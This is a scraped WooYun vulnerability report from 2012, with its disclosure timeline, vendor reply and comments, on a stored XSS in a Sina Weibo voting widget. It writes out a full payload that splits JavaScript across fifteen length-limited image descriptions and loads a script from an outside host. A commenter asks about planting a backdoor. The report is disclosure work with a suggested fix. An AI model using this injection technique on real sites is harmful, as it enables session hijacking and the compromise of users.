{"id": 18995, "wybug_id": "wooyun-2012-07854", "wybug_title": "新浪微博某官方应用存储型XSS - 重温一个利用方法～", "wybug_corp": "新浪", "wybug_author": "gainover", "wybug_date": "2012-06-04 08:10", "wybug_open_date": "2012-07-19 08:10", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "8", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["持久型", "技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-06-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-06-04：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-06-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-06-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-07-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-07-19：\t细节向公众公开  简要描述： 总的来说，该存储型XSS，是由于某页面的输出没过滤造成的。其实大部分都过滤了，就这里没过滤而已～ 算是小问题啦。 不过在漏洞的利用构造上，个人觉得还是挺有意思的!在4，5年前，由于QQ空间对用户昵称没过滤，但是QQ昵称的长度又被限制在很短的字符，也没办法插入很多内容，当时我就自己想到了这个方法，然后成功攻击了腾讯官方的QQ空间的留言板（那时候年少无知，马上被和谐了，当时觉得挺有意思的）。在此之后，一直没有再遇到到可以使用这个方法的场景。今天正好在新浪微博某官方应用中碰到了，就分享给大家。 详细说明：  1. 问题描述问题页面：http://vote.weibo.com/widget?vid=1772503问题原因：图片类型投票时，在投票组件（widget）中，输出图片描述未进行正确的过滤，导致XSS2. 问题是小问题，下面才是重点，利用过程。2.1 首先查看http://vote.weibo.com/widget?vid=1764421页面的输出内容。可以发现，实际可以被注入的地方为 <img title=\"{图片描述未过滤}\"></img>\n\n2.2 但是图片描述被限定为20个字符，之前Wooyun已经有人提交过选项内容长度没有在服务器端过滤的问题，经测试该问题已经修复，如下图：\n\n如何利用这20个字符插入我们的代码呢？首先想到的，还是 <img title=\"\"onload=\"eval(xxxxx)\"></img>其中xxxxx是可控的变量，而且这个变量的长度只能在5之内，经过查找没有我们可控的变量，唯一一个可能被控的$CONFIG$都已经超出长度了。只有eval(name)可以用了！2.3 但是eval(name)向来不是我推崇的方式。我们还得想办法！这个时候，我第二想到的，就是我若干年前在QQ空间使用过的一个方法。如下：因为投票实际上可以写入最多15个投票选项。输出的HTML代码大致如下：<img title=\"[可插入内容]\"></img><img title=\"[可插入内容]\"></img><img title=\"[可插入内容]\"></img><img title=\"[可插入内容]\"></img>....(一共15个)从而我们可以构造一个比较有意思的利用方式，模型如下：<img title=\"\"><script>/*\"></img><img title=\"*/var a='xxxxxxx';/*\"></img><img title=\"*/var b='yyyyyyy';/*\"></img><img title=\"*/eval(a+b);/*\"></img><img title=\"*/</script><b x=\"\"></img>2.4 上面的这个模型，会将之间的HTML代码通过/* ..... */ 的方式均变为注释。\n\n2.5 基于以上，我们可以构造以下完整的利用模型，不能超过15个短句，投票数目有限制。其次无法调用新浪网页自带的函数。\"><script>/**/var l='\\x3C';/**/var n='\\x3E';/**/var b='xsst.si';/**/var c='naapp.c';/**/var d='om/m.js';/**/var e='script ';/**/var f=l+e+'src';/**/var g=l+'/'+e;/**/var x=b+c+d;/**/var y=f+'=//'+x;/**/var z=y+n+g+n;/**/var j=document;/**/j.write(z);/**/</script><\"2.6 然后我们进入投票创建页面：http://vote.weibo.com/create?tab=pic一条一条的输入我们构造好的JS代码！\n\n2.7 等待投票审核通过后，我们查看投票的widget页面 http://vote.weibo.com/widget?vid=1772503\n\n   漏洞证明：  见：http://vote.weibo.com/widget?vid=1772503   修复方案：  对 http://vote.weibo.com/widget?vid=1772503 里的图片 title属性中的【图片描述】进行输出过滤！   版权声明：转载请注明来源 gainover@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2012-06-04 09:34 厂商回复： 感谢提供,我们马上处理. 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-06-04 08:50 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  洞主，执行代码是一部分，乃能留个后门永久控制咩？    \n     2012-06-04 09:16 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @xsser =.= 这个点估计不行，呆会发些新浪轻微博的，其中一个是可以的。    \n     2012-07-19 09:39 |    \t\t水滴 \t\t\t( 普通白帽子  |\t\t\t        Rank:146 漏洞数:24        )\t\t \n  碉堡啦    \n     2013-05-21 15:13 |    \t\t吉木 \t\t\t( 路人 |\t\t\t        Rank:24 漏洞数:5        )\t\t \n  有意思！    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}